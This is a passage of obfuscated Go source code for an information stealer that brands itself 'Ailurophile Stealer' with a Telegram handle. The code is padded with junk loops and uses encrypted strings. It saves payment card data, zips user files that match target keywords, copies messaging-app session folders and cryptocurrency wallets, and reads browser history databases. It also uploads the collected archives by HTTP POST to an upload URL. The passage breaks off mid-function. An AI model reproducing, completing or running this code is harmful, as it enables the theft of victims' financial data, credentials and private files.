		cardsFilePath := filepath.Join(cardsFolderPath, Cijosgmviuhoepbatohaaytukfezbopl("a0010d739db2bca024c1c8155e74c0664bb27d2c0e804fe613"))

		if _, err := os.Stat(cardsFilePath); err == nil {
			if err := os.Remove(cardsFilePath); err != nil {
			}
		}

		if err := os.WriteFile(cardsFilePath, []byte("Ailurophile Stealer - Telegram: @Ailurophilevn\n\n"+strings.Join(cards, Cijosgmviuhoepbatohaaytukfezbopl("56c839d8af0b49bca46006468ee9a099"))), 0644); err != nil {
		}
	}

	return totalCardsFound
}
func rqgoeloohwvycurhfbqqnhowljlzwcve(allowedExtensions []string, foldersToSearch []string, files []string, mainFolderPath string) int {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	totalFilesStolen := 0

	zipFilePath := filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a20913629cf3b8b039e5cb7bcff89bb28c56053d5603c207d13801"), Cijosgmviuhoepbatohaaytukfezbopl("9014107b8bf297be39e5cb2a558c80b405ce33fcf77e6b1cfb3ff151ac25cd91"))
	if _, err := os.Stat(filepath.Dir(zipFilePath)); os.IsNotExist(err) {
		if err := os.MkdirAll(filepath.Dir(zipFilePath), 0777); err != nil {
			return totalFilesStolen
		}
	}
	zipFile, err := os.Create(zipFilePath)
	if err != nil {
		return totalFilesStolen
	}
	defer zipFile.Close()

	zipWriter := zip.NewWriter(zipFile)
	defer zipWriter.Close()

	for _, folder := range foldersToSearch {
		directory := filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("b6333a45bece879e19c5ebd5e4e9fb63da9eaccee2b599ea13a03e")), folder)

		if _, err := os.Stat(directory); os.IsNotExist(err) || !lkbbnifqghlnswbjoplnndcwveuegfxv(directory) {
			continue
		}

		err := filepath.Walk(directory, func(filePath string, info os.FileInfo, err error) error {
			if err != nil {
				return err
			}

			if !info.IsDir() && lxfrdcxaxfvdkwbnyhzuvzovpchqpnrj(filePath, allowedExtensions, files) && info.Size() < 3*1024*1024 {
				zipFileWriter, err := zipWriter.Create(filepath.Base(filePath))
				if err != nil {
					return fmt.Errorf(Cijosgmviuhoepbatohaaytukfezbopl("86120d789cbca9bc34e0c03e5b9080a829b1702150814eb5f31dac24577237d34f2e27e5e0b3a67bc93dc671"), err)
				}

				file, err := os.Open(filePath)
				if err != nil {
					return fmt.Errorf(Cijosgmviuhoepbatohaaytukfezbopl("86120d789cbca7a835e7c7371cd68fad20f43e6e558d1803f7bf60042977641763cb006bf851"), err)
				}
				defer file.Close()

				_, err = io.Copy(zipFileWriter, file)
				if err != nil {
					return fmt.Errorf(Cijosgmviuhoepbatohaaytukfezbopl("86120d789cbcbfaa39fdc7371cd68fad20f4243a1fdb5dacb907a9777758e932e02888ddff34c8068286aac0b4"), err)
				}

				totalFilesStolen++
			}

			return nil
		})

		if err != nil {
		}
	}

	return totalFilesStolen
}
func lxfrdcxaxfvdkwbnyhzuvzovpchqpnrj(filePath string, allowedExtensions []string, files []string) bool {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	if filepath.Ext(filePath) == "" {
		return false
	}

	fileExtension := strings.ToLower(filepath.Ext(filePath)[1:])
	fileName := strings.ToLower(filepath.Base(filePath))

	if !eohvrqmvhwhhzqwzpfdxvubmhjmfoukw(allowedExtensions, fileExtension) {
		return false
	}

	for _, keyword := range files {
		if strings.Contains(fileName, keyword) {
			return true
		}
	}

	return false
}
func eohvrqmvhwhhzqwzpfdxvubmhjmfoukw(slice []string, item string) bool {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}
func lkbbnifqghlnswbjoplnndcwveuegfxv(path string) bool {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	info, err := os.Stat(path)
	if err != nil {
		return false
	}
	return info.IsDir()
}
func lafeykdwxhbyqrfikuielzzjufheriyb(mainpath string) bool {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	sourcePath := filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("a2302f53afc88957305affc98c063b943ad234004a8b15")), Cijosgmviuhoepbatohaaytukfezbopl("b705137289eea9b570cdcb2a108286b4be5315bc99e7b4c5730446be200b46ef"), Cijosgmviuhoepbatohaaytukfezbopl("97041e638f7b43cce0718b2cf03068e4a2eaf01d3f"))
	if _, err := os.Stat(sourcePath); os.IsNotExist(err) {
		return false
	}

	destinationPath := filepath.Join(mainpath, Cijosgmviuhoepbatohaaytukfezbopl("b705137289eea9b59ee8de4930119726c9b5b23430c113e3"))
	if _, err := os.Stat(destinationPath); os.IsNotExist(err) {
		if err := os.MkdirAll(destinationPath, 0777); err != nil {
			return false
		}
	}

	blacklistFolders := []string{"emoji", "user_data", "user_data#2", "user_data#3", "user_data#4", "user_data#5"}

	files, err := os.ReadDir(sourcePath)
	if err != nil {
		return false
	}

	for _, file := range files {
		if file.Name() == "." || file.Name() == ".." {
			continue
		}

		if !eohvrqmvhwhhzqwzpfdxvubmhjmfoukw(blacklistFolders, file.Name()) {
			sourceItemPath := filepath.Join(sourcePath, file.Name())
			targetItemPath := filepath.Join(destinationPath, file.Name())

			if file.IsDir() {
				if err := os.MkdirAll(targetItemPath, 0777); err != nil {
					continue
				}
				zhgvocmhbftzpksbhovptpfkqhxmjhlq(sourceItemPath, targetItemPath)
			} else {
				if err := vmkqmfmumrbafwxzglhqlqoflbfgmyia(sourceItemPath, targetItemPath); err != nil {
					continue
				}
			}
		}
	}

	return true
}
func zhgvocmhbftzpksbhovptpfkqhxmjhlq(src, dst string) {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	entries, err := os.ReadDir(src)
	if err != nil {
		return
	}

	for _, entry := range entries {
		srcPath := filepath.Join(src, entry.Name())
		dstPath := filepath.Join(dst, entry.Name())

		if entry.IsDir() {
			if err := os.MkdirAll(dstPath, 0777); err != nil {
				continue
			}
			zhgvocmhbftzpksbhovptpfkqhxmjhlq(srcPath, dstPath)
		} else {
			if err := vmkqmfmumrbafwxzglhqlqoflbfgmyia(srcPath, dstPath); err != nil {
				continue
			}
		}
	}
}
func rqwfxptonjbgpwldlmbbhqyvndmcxdfe(mainFolderPath string, wallets map[string]string) int {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	walletsDestination := filepath.Join(mainFolderPath, Cijosgmviuhoepbatohaaytukfezbopl("b401137b8be8bbe8a7be43490193871dd44e05884c976d"))

	if _, err := os.Stat(walletsDestination); os.IsNotExist(err) {
		if err := os.MkdirAll(walletsDestination, 0777); err != nil {
			return 0
		}
	}
	for walletName, walletSourcePath := range wallets {
		if _, err := os.Stat(walletSourcePath); os.IsNotExist(err) {
			continue
		}
		walletDestination := filepath.Join(walletsDestination, walletName)

		if _, err := os.Stat(walletDestination); os.IsNotExist(err) {
			if err := os.MkdirAll(walletDestination, 0777); err != nil {
				continue
			}
		}
		if err := ojtayxjnxfewtpucaoddextylyogbwil(walletSourcePath, walletDestination); err != nil {
			continue
		}
	}

	return 1
}
func itshogyyedwggahtntuzuawyazsscllf(data, key string) string {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	keyLength := len(key)
	dataLength := len(data)
	encryptedData := make([]byte, dataLength)
	{
		goto LOOP_INIT_qegdta
	LOOP_INIT_qegdta:
		;

		i := 0
		goto LOOP_COND_drlnul
	LOOP_COND_drlnul:
		if i < dataLength {
			goto LOOP_BODY_nktjqr
		} else {
			goto LOOP_END_bmgskr
		}
	LOOP_BODY_nktjqr:
		{
			encryptedData[i] = byte((int(data[i]) + int(key[i%keyLength])) % 256)
			i++
			goto LOOP_COND_drlnul

		}
	LOOP_END_bmgskr:
		{
		}
	}

	return base64.StdEncoding.EncodeToString(encryptedData)
}
func vyqmoebxvthosxevkoybhjnxayuxrgyf(source, destination string) error {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	if _, err := os.Stat(source); os.IsNotExist(err) {
		return fmt.Errorf(Cijosgmviuhoepbatohaaytukfezbopl("900f0a658df9e8be3fe5ca3c09d68dab29e224201f8f07a0b154fa263b89b889af781e0b22a1dbd21753dd270c5be21d"), source)
	}

	zipFile, err := os.Create(destination)
	if err != nil {
		return fmt.Errorf(Cijosgmviuhoepbatohaaytukfezbopl("800f0a7b8abca6b724a9cd2b1e979da16cf0762d189251a0f31dac241d16d6b3a30e9301881dd45d93f458fa"), err)
	}
	defer zipFile.Close()

	zipWriter := zip.NewWriter(zipFile)
	defer zipWriter.Close()

	sourcePath := filepath.Base(source)
	err = filepath.Walk(source, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		relativePath := filepath.Join(sourcePath, path[len(source):])

		if info.IsDir() {
			_, err := zipWriter.Create(relativePath + "/")
			if err != nil {
				return err
			}
		} else {
			fileToZip, err := os.Open(path)
			if err != nil {
				return err
			}
			defer fileToZip.Close()

			zipFileWriter, err := zipWriter.Create(relativePath)
			if err != nil {
				return err
			}

			_, err = io.Copy(zipFileWriter, fileToZip)
			if err != nil {
				return err
			}
		}

		return nil
	})

	return err
}
func sbepnwuncsfeqqfyupdmoxbjylmzzsil(zipFilePath, uploadUrl string) (string, error) {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	file, err := os.Open(zipFilePath)
	if err != nil {
		return "", fmt.Errorf(Cijosgmviuhoepbatohaaytukfezbopl("86120d789cbca7a835e7c7371cd68fad20f43e6e558d1803f7bf60042977641763cb006bf851"), err)
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile(Cijosgmviuhoepbatohaaytukfezbopl("85091372f10a454d9ff28d9d9101857e4316578a"), filepath.Base(zipFilePath))
	if err != nil {
		return "", fmt.Errorf(Cijosgmviuhoepbatohaaytukfezbopl("86120d789cbcabaa35e8da301591c9a223e3696e16924ba0f31dac2497fc44cd164034fbc165bf8dabd0551d"), err)
	}
	_, err = io.Copy(part, file)
	if err != nil {
		return "", fmt.Errorf(Cijosgmviuhoepbatohaaytukfezbopl("86120d789cbcabb720f0c7371cd68fad20f4242a118f46ffe918ff03f23fe15a21efbf5ea49d19ed7c0ac1"), err)
	}

	err = writer.Close()
	if err != nil {
		return "", fmt.Errorf(Cijosgmviuhoepbatohaaytukfezbopl("86120d789cbcabb43ffac7371cd69eb625e5613c4adb02b34910aca3beb064952c7697fa13c22bd9"), err)
	}

	req, err := http.NewRequest(Cijosgmviuhoepbatohaaytukfezbopl("b32f2c43235a4638d679c7e3d5bfad7c66c6fc3e"), uploadUrl, body)
	if err != nil {
		return "", fmt.Errorf(Cijosgmviuhoepbatohaaytukfezbopl("86120d789cbcabaa35e8da301591c9b629e0712b038f1de5ec4b1499b890a63f9ab93b92d96a7ba4ad70"), err)
	}
	req.Header.Set(Cijosgmviuhoepbatohaaytukfezbopl("a00f11638bf2bcf504f0de3cf0d5520ae2ef9c13f5ff91abfbba149c"), writer.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf(Cijosgmviuhoepbatohaaytukfezbopl("86120d789cbca5b93be0c03e5b848cb539f4773a4adb02b3d1e370622f085b225e474a8bdbd7f472"), err)
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf(Cijosgmviuhoepbatohaaytukfezbopl("86120d789cbcbabd31edc7371cd69ba13fe16b20039e07a7a659f068218ceb6dad85fff5fd28dc1c58a1837aa674ab"), err)
	}

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf(Cijosgmviuhoepbatohaaytukfezbopl("961013788ff8e8be31e0c23c1fccc9e13ff423ff92361e9b6eb43251637a37c1b3"), resp.Status)
	}

	return string(respBody), nil
}
func dwraztmzzddbsajluubeqskwpamqyfen(browserPaths [][]string, mainFolderPath string) int {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	totalHistoryEntries := 0

	for _, path := range browserPaths {
		historyEntries := []string{}
		if _, err := os.Stat(path[0]); os.IsNotExist(err) {
			continue
		}

		appName := tucygvoukqyipbfoqjkxjtnfgftmjcas(path[0])

		historyDataPath := filepath.Join(path[0], Cijosgmviuhoepbatohaaytukfezbopl("ab090c6381eeb1850def2d0a696ec69f13d51cc14b635e"))
		historyDbPath := filepath.Join(path[0], Cijosgmviuhoepbatohaaytukfezbopl("8b090c6381eeb1f634ebac80964d5271ec4df95ca14d3200b96f"))

		if _, err := os.Stat(historyDataPath); os.IsNotExist(err) {
			continue
		}

		err := vmkqmfmumrbafwxzglhqlqoflbfgmyia(historyDataPath, historyDbPath)
		if err != nil {
			continue
		}

		db, err := sql.Open(Cijosgmviuhoepbatohaaytukfezbopl("9011137e9af9fb194292514bf04fc6c9d2d5efcf86a86c"), historyDbPath)
		if err != nil {
			continue
		}
		defer db.Close()

		query := Cijosgmviuhoepbatohaaytukfezbopl("b0253352adc8e8ad22e582790f9f9da829bd243819884eb1965ee6276fddb1da25984fd09a78244dce785a44fc76bcb8cf02f7fb05f231abaea8d4941677f4e8f91675b6a357cbf2a4")
		rows, err := db.Query(query)
		if err != nil {
			continue
		}
		defer rows.Close()

		for rows.Next() {
			var url, title string
			var visitCount int
			var lastVisitTime int64
			if err := rows.Scan(&url, &title, &visitCount, &lastVisitTime); err != nil {
				continue
			}

			if url == "" {
				continue
			}

			lastVisitTime = (lastVisitTime / 1000000) - 11644473600
			dateVisited := time.Unix(lastVisitTime, 0).Format(Cijosgmviuhoepbatohaaytukfezbopl("d1504f21c3acf9f560bb8e684eccd9f076a131b86544112e738f1ffe26fd8a456795e5"))

			historyEntries = append(historyEntries, fmt.Sprintf(Cijosgmviuhoepbatohaaytukfezbopl("de5d422ad3a1f5e56db4936446cbd4f946c456024adb02b6c369e0266dcca7da6c8a36f2ac7d244a874f6a45fb6fe3b8ac34b2fa44f437e78bc1906ece12f6b5081f14a987e2489310289d612df6946c58e7de887af1bbcb2ea395555fa86b14bf4f5994a27f3dd6816e"), url, title, visitCount, dateVisited, appName, path[1]))
			totalHistoryEntries++
		}

		if len(historyEntries) == 0 {
			historyEntries = append(historyEntries, Cijosgmviuhoepbatohaaytukfezbopl("ad0f5f7f87efbcb722f08e3f148387a0ac4493998686ecf9ed98c248ad1a536f"))
		}

		if len(historyEntries) > 0 {
